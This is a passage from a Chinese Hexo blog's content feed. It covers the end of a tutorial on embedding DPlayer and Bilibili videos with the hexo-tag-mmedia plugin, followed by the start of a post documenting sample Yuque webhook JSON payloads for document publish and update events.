align="left"><code>true</code></td><td align="left">热键控制</td></tr><tr><td align="left">mutex</td><td align="left"><code>true</code></td><td align="left">互斥</td></tr><tr><td align="left">theme</td><td align="left"><code>#b7daff</code></td><td align="left">主题颜色</td></tr><tr><td align="left">lang</td><td align="left"></td><td align="left">语言，不指定会根据浏览器环境自动识别</td></tr><tr><td align="left">preload</td><td align="left"><code>auto</code></td><td align="left">预加载，可选 <code>none</code> <code>metadata</code> <code>auto</code></td></tr><tr><td align="left">logo</td><td align="left"></td><td align="left">logo 地址</td></tr><tr><td align="left">volume</td><td align="left">0.7</td><td align="left">默认音量 <code>0-1</code></td></tr><tr><td align="left">contextmenu</td><td align="left"></td><td align="left">右键菜单，可叠加</td></tr><tr><td align="left">highlight</td><td align="left"></td><td align="left">高光点，可叠加多个，例如 <code>&quot;highlight:&#123;time: 20, text: &#39;这是第 20 秒&#39;&#125;&quot;</code></td></tr><tr><td align="left">code</td><td align="left"></td><td align="left">额外代码，不懂不要填，需要写的请参考源码</td></tr></tbody></table><h4 id="示例（不知道就不要乱加，直接丢链接进去最好使）"><a href="#示例（不知道就不要乱加，直接丢链接进去最好使）" class="headerlink" title="示例（不知道就不要乱加，直接丢链接进去最好使）"></a>示例（不知道就不要乱加，直接丢链接进去最好使）</h4><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">&#123;<span class="hljs-meta">%</span> dplayer <span class="hljs-string">&quot;url:https://pic.gaficat.com/default/UpTown%20Spot.mp4&quot;</span> <span class="hljs-meta">%</span>&#125;<br></code></pre></td></tr></table></figure><h4 id="效果（来一段大狗吧）"><a href="#效果（来一段大狗吧）" class="headerlink" title="效果（来一段大狗吧）"></a>效果（来一段大狗吧）</h4><div id="mmedia-fvRZOqGn"></div><script src="https://cdn.jsdelivr.net/npm/dplayer/dist/DPlayer.min.js"></script>      <script>        var dp_fvRZOqGn = new DPlayer({            container: document.getElementById('mmedia-fvRZOqGn'),            autoplay: false,            theme: '#b7daff',            loop: false,            lang: navigator.language,            screenshot: false,            hotkey: true,            preload: 'auto',            logo: '',            volume: 0.7,            mutex: true,            video: { url: 'https://pic.gaficat.com/default/UpTown%20Spot.mp4', pic: '', thumbnails: '', type: 'auto'},                                    contextmenu: [{text: 'hexo-tag-mmedia', link: 'https://github.com/MonoLogueChi/hexo-tag-mmedia'}],            highlight: [],            undefined        });        dp_fvRZOqGn.on("fullscreen", function () { if (/Android|webOS|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) { screen.orientation.lock("landscape"); }});              </script>        <hr><h3 id="Bilibili"><a href="#Bilibili" class="headerlink" title="Bilibili"></a>Bilibili</h3><p>可以直接通过bilibili的iframe插入bilibili视频，当然也可以通过这种方式插入bilibili视频。</p><h4 id="格式-2"><a href="#格式-2" class="headerlink" title="格式"></a>格式</h4><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">&#123;<span class="hljs-meta">%</span> bilibili <span class="hljs-string">&quot;aid:43218022&quot;</span> <span class="hljs-string">&quot;quality:high&quot;</span> <span class="hljs-string">&quot;danmaku:false&quot;</span> <span class="hljs-string">&quot;allowfullscreen&quot;</span> <span class="hljs-meta">%</span>&#125;<br></code></pre></td></tr></table></figure><h4 id="字段说明-3"><a href="#字段说明-3" class="headerlink" title="字段说明"></a>字段说明</h4><table><thead><tr><th align="left">配置项</th><th align="left">默认</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">bvid</td><td align="left">none</td><td align="left">视频 bv 号，bvid、aid 和 av 必填一项，推荐使用 bvid</td></tr><tr><td align="left">aid</td><td align="left">none</td><td align="left">视频 av 号</td></tr><tr><td align="left">av</td><td align="left">none</td><td align="left">视频链接地址，不要带分 P 信息，与 aid 同时填写会被覆盖，不推荐使用</td></tr><tr><td align="left">page</td><td align="left"><code>1</code></td><td align="left">分 P，填写 av 时才会生效</td></tr><tr><td align="left">quality</td><td align="left"><code>low</code></td><td align="left">视频质量，可选 <code>high</code> <code>low</code></td></tr><tr><td align="left">danmaku</td><td align="left"><code>false</code></td><td align="left">开启弹幕，带有此参数表示 true，不带表示 false</td></tr><tr><td align="left">allowfullscreen</td><td align="left"><code>true</code></td><td align="left">是否允许全屏</td></tr><tr><td align="left">width</td><td align="left"><code>100%</code></td><td align="left">宽度</td></tr><tr><td align="left">max_width</td><td align="left"><code>800px</code></td><td align="left">最大宽度</td></tr><tr><td align="left">margin</td><td align="left"><code>auto</code></td><td align="left">位置，css 属性，例： <code>&quot;margin:auto&quot;</code> <code>&quot;margin:0 0 0 auto&quot;</code></td></tr></tbody></table><h4 id="示例（来一段自己弹得）"><a href="#示例（来一段自己弹得）" class="headerlink" title="示例（来一段自己弹得）"></a>示例（来一段自己弹得）</h4><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">&#123;<span class="hljs-meta">%</span> bilibili <span class="hljs-string">&quot;bvid:BV11b411S7qB&quot;</span> <span class="hljs-string">&quot;quality:high&quot;</span> <span class="hljs-string">&quot;danmaku:false&quot;</span> <span class="hljs-string">&quot;allowfullscreen&quot;</span> <span class="hljs-meta">%</span>&#125;<br></code></pre></td></tr></table></figure><h4 id="效果-2"><a href="#效果-2" class="headerlink" title="效果"></a>效果</h4>        <style>.bbplayer{width: 100%; max-width: 850px; margin: auto}</style>        <div class="bbplayer">        <iframe class="bbplayer" id="mmedia-tOFQldpI" src="//player.bilibili.com/player.html?bvid=BV11b411S7qB&page=1&high_quality=1&danmaku=false"            allowfullscreen="no"            scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts allow-popups"></iframe>        </div>        <script>            document.getElementById("mmedia-tOFQldpI").style.height=document.getElementById("mmedia-tOFQldpI").scrollWidth*0.76+"px";            window.onresize = function(){              document.getElementById("mmedia-tOFQldpI").style.height=document.getElementById("mmedia-tOFQldpI").scrollWidth*0.76+"px";            };        </script>        <h1 id="尾巴"><a href="#尾巴" class="headerlink" title="尾巴"></a>尾巴</h1><p>还在为插入音频、视频烦恼吗？<a href="https://github.com/u2sb/hexo-tag-mmedia">hexo-tag-mmedia</a>真的可以了解一下。</p><p>经过我实际测试，<a href="https://github.com/u2sb/hexo-tag-mmedia">hexo-tag-mmedia</a>和<a href="https://github.com/hexojs/hexo-generator-feed">hexo-generator-feed</a>并不冲突，当然啦，也许可以通过自行设置feed模板来解决<a href="https://github.com/MoePlayer/hexo-tag-aplayer">hexo-tag-aplayer</a>和<a href="https://github.com/hexojs/hexo-generator-feed">hexo-generator-feed</a>冲突的问题，但，既然有这么好的聚合插件，我为啥还要用别的呢，所有插件装一遍，太麻烦了。</p><p>就这样，晚安！</p>]]></content>
    
    
    <categories>
      
      <category>教程</category>
      
      <category>hexo</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hexo</tag>
      
      <tag>教程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>语雀webhook的那些坑</title>
    <link href="/posts/ff5ccbe6.html"/>
    <url>/posts/ff5ccbe6.html</url>
    
    <content type="html"><![CDATA[<h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><p>由于语雀webhook官方的文档，没有关于其字段的说明，本文记录下各种消息的示例，方便大家开发时参考。</p><a id="more"></a><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>我其实是notion的用户，但是因为网络的原因，国内和其他人合作还是需要国内的文档协作工具，就了解到了语雀。查询了语雀官方的webhook文档，发现除了说他有这个功能，如何开启这个功能以外，关于推送消息各个字段的说明，压根儿没有。我都主动来查webhook了，还不会设置callback地址之类的吗？我肯定是想查字段什么意思啊！真的不太懂语雀这个文档。</p><p>我的需求是：语雀知识库内的所有文档、评论和评论回复。其增、改、删除操作，都能交由我自己的webhook函数做一些处理，推送到server酱上，因为很多时候别人更新了文档，我自己并不知道，不能及时回复。</p><h1 id="语雀webhook的一些说明"><a href="#语雀webhook的一些说明" class="headerlink" title="语雀webhook的一些说明"></a>语雀webhook的一些说明</h1><p>语雀的webhook支持对具体知识库进行设置，可以推送的内容如下：</p><ul><li>发布文档（publish）：新建一个文档，点击发布的时候推送一条webhook消息。</li><li>更新文档（update）：更新文档后，点击发布的时候推送一条webhook消息。</li><li>删除文档（delete）：删除文档，将推送一条webhook消息。</li><li>新增评论（comment_create）：新增品论后，将推送一条webhook消息。</li><li>更新评论（comment_update）：更新评论后，将推送一条webhook消息。</li><li>删除评论（comment_delete）：删除评论后，将推送一条webhook消息。</li><li>新增评论回复（comment_reply_create）：对某一条评论进行回复后，将推送一条webhook消息。</li><li>更新评论回复（comment_reply_update）：对某一条评论的回复更新后，将推送一条webhook消息。</li><li>删除评论回复（comment_reply_delete）：删除某一条评论的回复后，将推送一条webhook消息。</li></ul><p>开启推送，在<code>知识库-&gt;设置-&gt;开发者</code>中，进行相关的设置就行了，可以设置多个callback地址，每个callback地址可以自由选择上述中的某几个或者全部进行推送。</p><center><img src="https://pic.gaficat.com/default/开启语雀webhook.png" alt="开启语雀webhook" style="zoom: 40%;" /></center><h1 id="webhook消息的示例"><a href="#webhook消息的示例" class="headerlink" title="webhook消息的示例"></a>webhook消息的示例</h1><h2 id="发布文档"><a href="#发布文档" class="headerlink" title="发布文档"></a>发布文档</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;data&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;id&quot;</span>: <span class="hljs-number">13230337</span>,<br>    <span class="hljs-attr">&quot;slug&quot;</span>: <span class="hljs-string">&quot;qddytu&quot;</span>,<br>    <span class="hljs-attr">&quot;title&quot;</span>: <span class="hljs-string">&quot;这是文章的标题&quot;</span>,<br>    <span class="hljs-attr">&quot;book_id&quot;</span>: <span class="hljs-number">1782464</span>,<br>    <span class="hljs-attr">&quot;book&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;id&quot;</span>: <span class="hljs-number">1782464</span>,<br>      <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;Book&quot;</span>,<br>      <span class="hljs-attr">&quot;slug&quot;</span>: <span class="hljs-string">&quot;tx5fs5&quot;</span>,<br>      <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;示例知识库&quot;</span>,<br>      <span class="hljs-attr">&quot;user_id&quot;</span>: <span class="hljs-number">593074</span>,<br>      <span class="hljs-attr">&quot;description&quot;</span>: <span class="hljs-string">&quot;点滴学习，随时记录&quot;</span>,<br>      <span class="hljs-attr">&quot;creator_id&quot;</span>: <span class="hljs-number">593074</span>,<br>      <span class="hljs-attr">&quot;public&quot;</span>: <span class="hljs-number">1</span>,<br>      <span class="hljs-attr">&quot;items_count&quot;</span>: <span class="hljs-number">3</span>,<br>      <span class="hljs-attr">&quot;likes_count&quot;</span>: <span class="hljs-number">0</span>,<br>      <span class="hljs-attr">&quot;watches_count&quot;</span>: <span class="hljs-number">1</span>,<br>      <span class="hljs-attr">&quot;content_updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:42:28.088Z&quot;</span>,<br>      <span class="hljs-attr">&quot;updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:42:28.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;created_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:39:58.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;user&quot;</span>: <span class="hljs-literal">null</span>,<br>      <span class="hljs-attr">&quot;_serializer&quot;</span>: <span class="hljs-string">&quot;v2.book&quot;</span><br>    &#125;,<br>    <span class="hljs-attr">&quot;user_id&quot;</span>: <span class="hljs-number">593074</span>,<br>    <span class="hljs-attr">&quot;user&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;id&quot;</span>: <span class="hljs-number">593074</span>,<br>      <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;User&quot;</span>,<br>      <span class="hljs-attr">&quot;login&quot;</span>: <span class="hljs-string">&quot;flamingcrystal&quot;</span>,<br>      <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Flaming Crystal&quot;</span>,<br>      <span class="hljs-attr">&quot;description&quot;</span>: <span class="hljs-literal">null</span>,<br>      <span class="hljs-attr">&quot;avatar_url&quot;</span>: <span class="hljs-string">&quot;https://cdn.nlark.com/yuque/0/2019/jpeg/anonymous/1573519967166-e0d21489-4ab5-49b6-8893-7e77c44cd2b5.jpeg&quot;</span>,<br>      <span class="hljs-attr">&quot;books_count&quot;</span>: <span class="hljs-number">5</span>,<br>      <span class="hljs-attr">&quot;public_books_count&quot;</span>: <span class="hljs-number">1</span>,<br>      <span class="hljs-attr">&quot;followers_count&quot;</span>: <span class="hljs-number">0</span>,<br>      <span class="hljs-attr">&quot;following_count&quot;</span>: <span class="hljs-number">0</span>,<br>      <span class="hljs-attr">&quot;created_at&quot;</span>: <span class="hljs-string">&quot;2019-11-12T00:53:12.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:39:58.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;_serializer&quot;</span>: <span class="hljs-string">&quot;v2.user&quot;</span><br>    &#125;,<br>    <span class="hljs-attr">&quot;format&quot;</span>: <span class="hljs-string">&quot;lake&quot;</span>,<br>    <span class="hljs-attr">&quot;body&quot;</span>: <span class="hljs-string">&quot;这是文章的内容\n&lt;a name=\&quot;D4wZf\&quot;&gt;&lt;/a&gt;\n# 一级标题\n**加粗**&lt;br /&gt;_斜体_\n\n- list\n&quot;</span>,<br>    <span class="hljs-attr">&quot;body_draft&quot;</span>: <span class="hljs-string">&quot;这是文章的内容\n&lt;a name=\&quot;D4wZf\&quot;&gt;&lt;/a&gt;\n# 一级标题\n**加粗**&lt;br /&gt;_斜体_\n\n- list\n&quot;</span>,<br>    <span class="hljs-attr">&quot;body_html&quot;</span>: <span class="hljs-string">&quot;&lt;!doctype html&gt;&lt;div class=\&quot;lake-content-editor-core lake-engine lake-typography-traditional\&quot; data-lake-element=\&quot;root\&quot; data-selection-undefined=\&quot;%7B%22path%22%3A%5B%5B4%2C0%2C0%2C4%5D%2C%5B4%2C0%2C0%2C4%5D%5D%2C%22active%22%3Atrue%7D\&quot;&gt;&lt;p data-lake-id=\&quot;b791fecaceb7f4797bb8db8ea980d83b\&quot; style=\&quot;font-size: 14px; color: rgb(38, 38, 38); line-height: 1.74; letter-spacing: 0.05em; outline-style: none; overflow-wrap: break-word; margin: 0px;\&quot;&gt;&lt;span&gt;这是文章的内容&lt;/span&gt;&lt;/p&gt;&lt;h1 data-lake-id=\&quot;32cf8b61bf32d3ce61e3918c025210a3\&quot; id=\&quot;D4wZf\&quot; style=\&quot;padding: 7px 0px; margin: 0px; font-weight: 700; font-size: 28px; line-height: 36px;\&quot;&gt;一级标题&lt;/h1&gt;&lt;p data-lake-id=\&quot;c2217c5c3a0ca3e2964daf6e9d9d6372\&quot; style=\&quot;font-size: 14px; color: rgb(38, 38, 38); line-height: 1.74; letter-spacing: 0.05em; outline-style: none; overflow-wrap: break-word; margin: 0px;\&quot;&gt;&lt;strong&gt;加粗&lt;/strong&gt;&lt;/p&gt;&lt;p data-lake-id=\&quot;aa28e7cfeb7ea314fb2017c4d3d0301a\&quot; style=\&quot;font-size: 14px; color: rgb(38, 38, 38); line-height: 1.74; letter-spacing: 0.05em; outline-style: none; overflow-wrap: break-word; margin: 0px;\&quot;&gt;&lt;em&gt;斜体&lt;/em&gt;&lt;/p&gt;&lt;ul data-lake-id=\&quot;9cbd73bdb6680f9f7eb9fde5217a2ffc\&quot; start=\&quot;-\&quot; lake-indent=\&quot;0\&quot; style=\&quot;list-style-type: disc; margin: 0px; padding-left: 23px; font-size: 14px; color: rgb(38, 38, 38); line-height: 1.74; letter-spacing: 0.05em; outline-style: none; overflow-wrap: break-word;\&quot;&gt;&lt;li data-lake-id=\&quot;5a58e37ebb365f1905bde74c98d19061\&quot;&gt;list&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&quot;</span>,<br>    <span class="hljs-attr">&quot;public&quot;</span>: <span class="hljs-number">1</span>,<br>    <span class="hljs-attr">&quot;status&quot;</span>: <span class="hljs-number">1</span>,<br>    <span class="hljs-attr">&quot;view_status&quot;</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-attr">&quot;read_status&quot;</span>: <span class="hljs-number">1</span>,<br>    <span class="hljs-attr">&quot;likes_count&quot;</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-attr">&quot;comments_count&quot;</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-attr">&quot;content_updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:42:28.000Z&quot;</span>,<br>    <span class="hljs-attr">&quot;deleted_at&quot;</span>: <span class="hljs-literal">null</span>,<br>    <span class="hljs-attr">&quot;created_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:40:57.000Z&quot;</span>,<br>    <span class="hljs-attr">&quot;updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:42:28.000Z&quot;</span>,<br>    <span class="hljs-attr">&quot;published_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:42:28.000Z&quot;</span>,<br>    <span class="hljs-attr">&quot;first_published_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:42:28.000Z&quot;</span>,<br>    <span class="hljs-attr">&quot;word_count&quot;</span>: <span class="hljs-number">17</span>,<br>    <span class="hljs-attr">&quot;_serializer&quot;</span>: <span class="hljs-string">&quot;webhook.doc_detail&quot;</span>,<br>    <span class="hljs-attr">&quot;path&quot;</span>: <span class="hljs-string">&quot;flamingcrystal/tx5fs5/qddytu&quot;</span>,<br>    <span class="hljs-attr">&quot;publish&quot;</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-attr">&quot;action_type&quot;</span>: <span class="hljs-string">&quot;publish&quot;</span>,<br>    <span class="hljs-attr">&quot;webhook_subject_type&quot;</span>: <span class="hljs-string">&quot;publish&quot;</span>,<br>    <span class="hljs-attr">&quot;actor_id&quot;</span>: <span class="hljs-number">593074</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="更新文档"><a href="#更新文档" class="headerlink" title="更新文档"></a>更新文档</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;data&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;id&quot;</span>: <span class="hljs-number">13230337</span>,<br>    <span class="hljs-attr">&quot;slug&quot;</span>: <span class="hljs-string">&quot;qddytu&quot;</span>,<br>    <span class="hljs-attr">&quot;title&quot;</span>: <span class="hljs-string">&quot;这是文章的标题&quot;</span>,<br>    <span class="hljs-attr">&quot;book_id&quot;</span>: <span class="hljs-number">1782464</span>,<br>    <span class="hljs-attr">&quot;book&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;id&quot;</span>: <span class="hljs-number">1782464</span>,<br>      <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;Book&quot;</span>,<br>      <span class="hljs-attr">&quot;slug&quot;</span>: <span class="hljs-string">&quot;tx5fs5&quot;</span>,<br>      <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;示例知识库&quot;</span>,<br>      <span class="hljs-attr">&quot;user_id&quot;</span>: <span class="hljs-number">593074</span>,<br>      <span class="hljs-attr">&quot;description&quot;</span>: <span class="hljs-string">&quot;点滴学习，随时记录&quot;</span>,<br>      <span class="hljs-attr">&quot;creator_id&quot;</span>: <span class="hljs-number">593074</span>,<br>      <span class="hljs-attr">&quot;public&quot;</span>: <span class="hljs-number">1</span>,<br>      <span class="hljs-attr">&quot;items_count&quot;</span>: <span class="hljs-number">3</span>,<br>      <span class="hljs-attr">&quot;likes_count&quot;</span>: <span class="hljs-number">0</span>,<br>      <span class="hljs-attr">&quot;watches_count&quot;</span>: <span class="hljs-number">1</span>,<br>      <span class="hljs-attr">&quot;content_updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:43:57.966Z&quot;</span>,<br>      <span class="hljs-attr">&quot;updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:43:58.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;created_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:39:58.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;user&quot;</span>: <span class="hljs-literal">null</span>,<br>      <span class="hljs-attr">&quot;_serializer&quot;</span>: <span class="hljs-string">&quot;v2.book&quot;</span><br>    &#125;,<br>    <span class="hljs-attr">&quot;user_id&quot;</span>: <span class="hljs-number">593074</span>,<br>    <span class="hljs-attr">&quot;user&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;id&quot;</span>: <span class="hljs-number">593074</span>,<br>      <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;User&quot;</span>,<br>      <span class="hljs-attr">&quot;login&quot;</span>: <span class="hljs-string">&quot;flamingcrystal&quot;</span>,<br>      <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Flaming Crystal&quot;</span>,<br>      <span class="hljs-attr">&quot;description&quot;</span>: <span class="hljs-literal">null</span>,<br>      <span class="hljs-attr">&quot;avatar_url&quot;</span>: <span class="hljs-string">&quot;https://cdn.nlark.com/yuque/0/2019/jpeg/anonymous/1573519967166-e0d21489-4ab5-49b6-8893-7e77c44cd2b5.jpeg&quot;</span>,<br>      <span class="hljs-attr">&quot;books_count&quot;</span>: <span class="hljs-number">5</span>,<br>      <span class="hljs-attr">&quot;public_books_count&quot;</span>: <span class="hljs-number">1</span>,<br>      <span class="hljs-attr">&quot;followers_count&quot;</span>: <span class="hljs-number">0</span>,<br>      <span class="hljs-attr">&quot;following_count&quot;</span>: <span class="hljs-number">0</span>,<br>      <span class="hljs-attr">&quot;created_at&quot;</span>: <span class="hljs-string">&quot;2019-11-12T00:53:12.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:39:58.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;_serializer&quot;</span>: <span class="hljs-string">&quot;v2.user&quot;</span><br>    &#125;,<br>    <span class="hljs-attr">&quot;format&quot;</span>: <span class="hljs-string">&quot;lake&quot;</span>,<br>    <span class="hljs-attr">&quot;body&quot;</span>: <span class="hljs-string">&quot;更新了文章&lt;br /&gt;这是文章的内容\n&lt;a name=\&quot;D4wZf\&quot;&gt;&lt;/a&gt;\n# 一级标题\n**加粗**&lt;br /&gt;_斜体_\n\n- list\n&quot;</span>,<br>    <span class="hljs-attr">&quot;body_draft&quot;</span>: <span class="hljs-string">&quot;更新了文章&lt;br /&gt;这是文章的内容\n&lt;a name=\&quot;D4wZf\&quot;&gt;&lt;/a&gt;\n# 一级标题\n**加粗**&lt;br /&gt;_斜体_\n\n- list\n&quot;</span>,<br>    <span class="hljs-attr">&quot;body_html&quot;</span>: <span class="hljs-string">&quot;&lt;!doctype html&gt;&lt;div class=\&quot;lake-content-editor-core lake-engine lake-typography-traditional\&quot; data-lake-element=\&quot;root\&quot; data-selection-undefined=\&quot;%7B%22path%22%3A%5B%5B2%2C0%2C4%5D%2C%5B2%2C0%2C4%5D%5D%2C%22active%22%3Atrue%7D\&quot;&gt;&lt;p data-lake-id=\&quot;e17bcb083075181b3ca5ecd490e0fdf8\&quot; style=\&quot;font-size: 14px; color: rgb(38, 38, 38); line-height: 1.74; letter-spacing: 0.05em; outline-style: none; overflow-wrap: break-word; margin: 0px;\&quot;&gt;&lt;span style=\&quot;color: rgb(245, 34, 45);\&quot;&gt;更新了文章&lt;/span&gt;&lt;/p&gt;&lt;p data-lake-id=\&quot;b791fecaceb7f4797bb8db8ea980d83b\&quot; style=\&quot;font-size: 14px; color: rgb(38, 38, 38); line-height: 1.74; letter-spacing: 0.05em; outline-style: none; overflow-wrap: break-word; margin: 0px;\&quot;&gt;&lt;span&gt;这是文章的内容&lt;/span&gt;&lt;/p&gt;&lt;h1 data-lake-id=\&quot;32cf8b61bf32d3ce61e3918c025210a3\&quot; id=\&quot;D4wZf\&quot; style=\&quot;padding: 7px 0px; margin: 0px; font-weight: 700; font-size: 28px; line-height: 36px;\&quot;&gt;一级标题&lt;/h1&gt;&lt;p data-lake-id=\&quot;c2217c5c3a0ca3e2964daf6e9d9d6372\&quot; style=\&quot;font-size: 14px; color: rgb(38, 38, 38); line-height: 1.74; letter-spacing: 0.05em; outline-style: none; overflow-wrap: break-word; margin: 0px;\&quot;&gt;&lt;strong&gt;加粗&lt;/strong&gt;&lt;/p&gt;&lt;p data-lake-id=\&quot;aa28e7cfeb7ea314fb2017c4d3d0301a\&quot; style=\&quot;font-size: 14px; color: rgb(38, 38, 38); line-height: 1.74; letter-spacing: 0.05em; outline-style: none; overflow-wrap: break-word; margin: 0px;\&quot;&gt;&lt;em&gt;斜体&lt;/em&gt;&lt;/p&gt;&lt;ul data-lake-id=\&quot;9cbd73bdb6680f9f7eb9fde5217a2ffc\&quot; lake-indent=\&quot;0\&quot; style=\&quot;list-style-type: disc; margin: 0px; padding-left: 23px; font-size: 14px; color: rgb(38, 38, 38); line-height: 1.74; letter-spacing: 0.05em; outline-style: none; overflow-wrap: break-word;\&quot;&gt;&lt;li data-lake-id=\&quot;5a58e37ebb365f1905bde74c98d19061\&quot;&gt;list&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&quot;</span>,<br>    <span class="hljs-attr">&quot;public&quot;</span>: <span class="hljs-number">1</span>,<br>    <span class="hljs-attr">&quot;status&quot;</span>: <span class="hljs-number">1</span>,<br>    <span class="hljs-attr">&quot;view_status&quot;</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-attr">&quot;read_status&quot;</span>: <span class="hljs-number">1</span>,<br>    <span class="hljs-attr">&quot;likes_count&quot;</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-attr">&quot;comments_count&quot;</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-attr">&quot;content_updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:43:57.000Z&quot;</span>,<br>    <span class="hljs-attr">&quot;deleted_at&quot;</span>: <span class="hljs-literal">null</span>,<br>    <span class="hljs-attr">&quot;created_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:40:57.000Z&quot;</span>,<br>    <span class="hljs-attr">&quot;updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:43:58.000Z&quot;</span>,<br>    <span class="hljs-attr">&quot;published_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:43:57.000Z&quot;</span>,<br>    